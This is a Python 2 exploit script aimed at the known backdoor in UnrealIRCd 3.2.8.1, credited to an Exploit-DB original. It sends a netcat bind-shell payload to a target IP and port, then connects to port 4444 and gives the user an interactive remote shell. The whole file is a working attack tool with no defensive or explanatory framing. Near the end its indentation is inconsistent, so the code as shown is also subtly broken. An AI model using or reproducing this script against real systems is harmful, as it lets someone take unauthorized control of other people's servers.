#!/usr/bin/python
 
#This exploit will trigger a backdoor found in version 3.2.8.1 of unreal IRC
#A
#Original exploit (Exploit-DB) --> https://www.exploit-db.com/exploits/16922/
#Happy hacking! 
 
import sys
import socket
import threading
import time
 
if len(sys.argv) == 3:
    pass
else:
    print "usage: ./exploit.py [TARGET IP] [TARGET PORT]"
    print '\nThis exploit will trigger a backdoor in unreal IRC version 3.2.8.1\n'
    print 'Original Exploit (Exploit-DB) --> https://www.exploit-db.com/exploits/16922'
    sys.exit(1)
 
payload = "/bin/nc -l -p 4444 -e /bin/bash"
target = sys.argv[1]
port = sys.argv[2]
 
def trigger():
    print '[*] Attempting to Trigger the Backdoor... '
    trigger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        trigger_socket.connect((target, int(port)))
    except Exception:
        print '[!] Failed to Reach Target'
        sys.exit(1)
    trigger_socket.send("AB;" + payload + "\n")
    trigger_socket.close()
    return
 
def shell_sock_recv(sock, status):
    sock.settimeout(3)
    while 1:
        if status == True:
            try:
                print sock.recv(1024).strip()
            except socket.timeout:
                pass
            except Exception:
                return
        else:
            return
 
def handle():
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    trigger()
    print '[*] Trigger Process Complete'
    shell_status = True
    try:
        shell_socket.connect((target, 4444))
    except Exception:
        print '[!] Error Occured During Shell Spawn'
        sys.exit(1)
    shell_recv_thread = threading.Thread(target=shell_sock_recv, args=(shell_socket, shell_status))
    shell_recv_thread.start()
    print '[*] Root Shell Spawned, Pwnage Complete\n'
    while 1:
        try:
            command = raw_input().strip()
            if command == 'exit':
                print '[*] Shutting Down... (This may take a minute)'
                shell_status = False
                shell_socket.close()
                shell_recv_thread.join()
                sys.exit(1)
            shell_socket.send(command + '\n')
        except KeyboardInterrupt:
            pass
        except Exception:
            print '[!] An Error Occured During Interaction'
            shell_status = False
            shell_socket.close()
                        shell_recv_thread.join()
                        sys.exit(1)
try:
    handle()
except Exception:
    sys.exit(1)